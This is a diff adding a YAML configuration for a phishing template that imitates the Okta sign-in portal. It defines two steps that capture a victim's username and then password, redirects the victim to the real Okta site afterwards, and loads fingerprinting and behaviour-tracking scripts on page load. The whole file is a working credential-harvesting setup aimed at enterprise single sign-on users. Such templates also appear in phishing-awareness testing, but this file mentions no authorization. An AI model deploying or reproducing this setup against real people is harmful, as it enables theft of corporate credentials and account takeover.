@@ -1,0 +1,43 @@
+info:
+  name: Okta Login
+  author: mh4x0f
+  description: A phishing template that emulates the Okta authentication portal, targeting enterprise users. Designed to capture corporate credentials in environments that rely on single sign-on (SSO) solutions.
+  category: corporate
+  system: true
+  tags:
+    - okta
+    - mobile
+    - web
+template_dir: okta_login
+steps:
+  - id: username
+    title: Okta Username Page
+    path: /login
+    method: POST
+    template_file: username.html
+    next: password
+    capture:
+      enabled: true
+      fields:
+        - name: username
+          required: true
+          validate_regex: ^\S+$
+          error_message: This field cannot be left blank
+    simulate_delay_ms: 300
+  - id: password
+    title: Okta Password Page
+    path: /verify
+    method: POST
+    template_file: password.html
+    redirect_url: https://www.okta.com
+    capture:
+      enabled: true
+      fields:
+        - name: password
+          required: true
+          validate_regex: ^.{6,}$
+          error_message: Unable to sign in
+hooks:
+  onLoad:
+    - /hooks/fingerprint.js
+    - /hooks/behavior.js
